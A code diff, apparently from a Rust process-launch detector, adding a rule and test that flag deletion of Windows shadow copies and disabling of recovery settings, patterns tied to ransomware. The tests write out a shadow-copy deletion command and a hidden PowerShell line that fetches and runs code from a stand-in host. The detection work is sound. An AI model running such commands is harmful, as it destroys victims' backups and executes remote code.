@@ -74,6 +74,16 @@ pub fn judge(parent: &str, child: &str, cmd: &str) -> Option<ChainVerdict> {
     let shell = SHELLS.contains(&c.as_str());
     let tricky = risky_args(&c, cmd);
 
+    // Deleting Windows' backup copies: what ransomware does right before encrypting.
+    let lc = cmd.to_ascii_lowercase();
+    let backups = (c == "vssadmin.exe" && lc.contains("delete")) || (c == "vssadmin.exe" && lc.contains("resize") && lc.contains("shadowstorage"))
+        || (c == "wmic.exe" && lc.contains("shadowcopy") && lc.contains("delete"))
+        || (c == "wbadmin.exe" && lc.contains("delete"))
+        || (c == "bcdedit.exe" && (lc.contains("recoveryenabled no") || lc.contains("bootstatuspolicy ignoreallfailures")))
+        || (shell && lc.contains("win32_shadowcopy") && (lc.contains("delete") || lc.contains("remove-")));
+    if backups {
+        return Some(ChainVerdict { severity: Severity::High, reason: format!("{} tried to delete Windows' backup copies or recovery options ({c}). Ransomware does this right before encrypting files.", label(parent)) });
+    }
     if office_like && (host || shell) {
         return Some(ChainVerdict {
             severity: Severity::High,
@@ -112,6 +122,13 @@ mod tests {
         assert_eq!(judge("cmd.exe", "regsvr32.exe", &squiblydoo).unwrap().severity, Severity::Medium);
         let clickfix = j(&["powershell -w hidden -c \"iw", "r http://x.invalid/p | ie", "x\""]);
         assert_eq!(judge("explorer.exe", "powershell.exe", &clickfix).unwrap().severity, Severity::High);
+    }
+
+    #[test]
+    fn backup_deletion_is_stopped() {
+        let v = judge("cmd.exe", "vssadmin.exe", &j(&["vssadmin del", "ete shadows /all /quiet"])).unwrap();
+        assert_eq!(v.severity, Severity::High);
+        assert!(judge("svchost.exe", "vssadmin.exe", "vssadmin list shadows").is_none());
     }
 
     #[test]
